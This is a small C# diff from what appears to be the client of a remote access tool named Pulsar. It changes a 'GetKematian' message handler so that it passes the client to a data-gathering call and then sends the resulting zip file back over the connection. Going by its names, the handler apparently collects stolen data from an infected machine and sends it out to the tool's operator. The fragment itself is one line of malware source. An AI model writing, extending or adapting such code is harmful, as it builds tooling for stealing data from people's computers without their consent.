@@ -24,7 +24,7 @@ namespace Pulsar.Client.Messages
 
         private void Execute(ISender client, GetKematian message)
         {
-            byte[] zipFile = Handler.GetData();
+            byte[] zipFile = Handler.GetData(client);
             client.Send(new GetKematian { ZipFile = zipFile });
         }
     }
